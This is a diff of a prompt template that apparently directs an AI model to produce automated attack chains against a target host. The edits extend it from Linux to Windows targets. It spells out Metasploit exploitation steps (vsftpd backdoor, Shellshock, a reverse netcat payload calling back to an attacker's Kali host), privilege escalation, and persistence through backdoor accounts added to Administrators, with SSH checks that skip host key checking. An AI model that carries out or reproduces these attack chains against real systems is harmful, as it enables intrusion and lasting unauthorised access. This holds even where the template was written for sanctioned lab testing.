@@ -30,15 +30,14 @@ CRITICAL REQUIREMENTS FOR ATTACK CHAINS:
    ❌ NEVER use string format: "commands": ["some command", "another command"]
    ✅ ALWAYS use object format: "commands": [{"type": "regular", "command": "some command"}]
 
-3. PYTHON SCRIPTING RULES (CRITICAL):
-   - ❌ DO NOT use single quotes for multi-line strings. This causes SyntaxErrors.
-   - ✅ PREFERRED: Use triple quotes (''') for payloads containing newlines.
-   - Example:
-     {
-       "type": "regular",
-       "command": "cat > /tmp/exploit.py << 'EOF'\nimport socket\npayload = '''() { :;}; /bin/bash -c ...'''\n# code...\nEOF"
-     }
-   - ALWAYS include timeouts on sockets: s.settimeout(10)
+3. SCRIPTING RULES (CRITICAL):
+   - All commands run NON-INTERACTIVELY. If a command would wait for input, pipe
+     input into it or add a timeout. Interactive commands will hang.
+   - For Python scripts: use triple quotes (''') for multi-line strings, include
+     socket timeouts (s.settimeout(10)).
+   - For file creation: use OS-appropriate methods.
+     Linux: cat > /tmp/file << 'EOF' ... EOF
+     Windows: echo or powershell to write files, use C:\Temp\ paths
 
 4. METASPLOIT EXPLOITATION PATTERN:
    Stage 1 (initial_access):
@@ -52,34 +51,37 @@ CRITICAL REQUIREMENTS FOR ATTACK CHAINS:
    
    Stage 2 (privilege_escalation):
    - Use SAME session to interact with exploit session
-   - Run "sessions -i 1 -c 'id'"
-   
+   - Run the appropriate identity command for the target OS:
+     Linux/FreeBSD: "sessions -i <ID> -c 'id'"
+     Windows: "sessions -i <ID> -c 'whoami'"
+
    Stage 3 (persistence):
-   - Use SAME session to create backdoors
+   - Use SAME session to create backdoors appropriate for __TARGET_OS__
    - Close the persistent msfconsole session
-   - Verify persistence with SSH test (regular command)
+   - Verify persistence (e.g., SSH on Linux, or bind shell/WinRM on Windows)
 
 5. COMMAND SYNTAX & SAFETY (CRITICAL):
-   a) SSH Flags (Legacy Support):
-      sshpass -p 'pass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@__TARGET_IP__ 'cmd'
+   All commands must be appropriate for the target OS (__TARGET_OS__).
 
-   b) SUDO PIPING RULE (The "sh -c" Wrapper):
-      If you are piping data into a command running with sudo (like chpasswd), you MUST wrap the command in "sh -c".
-      ❌ WRONG: echo 'pass' | sudo -S echo 'user:pass' | chpasswd
-      ✅ CORRECT: echo 'pass' | sudo -S sh -c "echo 'user:pass' | chpasswd"
+   a) Persistence Verification:
+      Linux: sshpass -p 'pass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@__TARGET_IP__ 'id'
+      Windows: Use bind shell, WinRM, or PSExec to verify. Most Windows targets do not have SSH.
 
-   c) USER CREATION RULE (Avoid Shell Expansion):
-      ❌ DO NOT use: useradd -p $(openssl passwd ...)
-      ✅ USE:
-         1. useradd -m -s /bin/bash newuser
-         2. echo 'newuser:password' | chpasswd
+   b) Privilege Piping:
+      Linux: echo 'pass' | sudo -S sh -c "echo 'user:pass' | chpasswd"
+      Windows: Not applicable (exploits typically give SYSTEM directly)
+
+   c) User Creation:
+      Linux: useradd -m -s /bin/bash newuser && echo 'newuser:password' | chpasswd
+      Windows: net user newuser password /add && net localgroup Administrators newuser /add
 
 6. PAYLOAD SELECTION HEURISTICS (LOGIC RULES):
    
-   RULE A: The "vsftpd 2.3.4" Exception
-   - IF the module is `exploit/unix/ftp/vsftpd_234_backdoor`:
-     - DO NOT set PAYLOAD.
-     - DO NOT set LHOST or LPORT.
+   RULE A: Backdoor / Bind-Shell Exploits (no payload needed)
+   - Some exploit modules use built-in payloads (e.g., backdoors that open a
+     bind shell on the target). These do NOT require setting PAYLOAD, LHOST, or LPORT.
+   - Example: `exploit/unix/ftp/vsftpd_234_backdoor` opens port 6200 directly.
+   - If the module documentation indicates no payload is needed, skip payload config.
 
    RULE B: ALL OTHER EXPLOITS (ProFTPD, UnrealIRCd, Samba, Shellshock, etc.)
    - YOU MUST SET A PAYLOAD appropriate for the target OS.
@@ -123,7 +125,7 @@ EXAMPLE OUTPUT FORMAT:
                         { "type": "start_session", "session_name": "rce_session", "command": "msfconsole -q" },
                         { "type": "session_command", "session_name": "rce_session", "command": "use exploit/linux/misc/rce", "wait": 2 },
                         { "type": "session_command", "session_name": "rce_session", "command": "set RHOSTS __TARGET_IP__", "wait": 1 },
-                        { "type": "session_command", "session_name": "rce_session", "command": "set PAYLOAD cmd/unix/reverse_netcat", "wait": 1 },
+                        { "type": "session_command", "session_name": "rce_session", "command": "set PAYLOAD <payload_for_target_os>", "wait": 1 },
                         { "type": "session_command", "session_name": "rce_session", "command": "set LHOST __KALI_IP__", "wait": 1 },
                         { "type": "session_command", "session_name": "rce_session", "command": "set LPORT 4445", "wait": 1 },
                         { "type": "session_command", "session_name": "rce_session", "command": "exploit -j", "wait": 15 },
